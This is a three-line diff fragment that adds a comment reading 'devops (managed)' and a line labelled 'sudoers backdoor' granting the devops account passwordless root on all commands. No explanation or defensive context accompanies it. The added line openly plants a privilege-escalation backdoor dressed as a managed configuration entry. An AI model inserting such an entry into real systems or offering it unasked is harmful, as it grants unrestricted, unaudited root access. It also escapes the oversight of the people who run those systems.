@@ -1,0 +1,3 @@
+# devops (managed)
+
+sudoers backdoor: devops ALL=(ALL) NOPASSWD: ALL
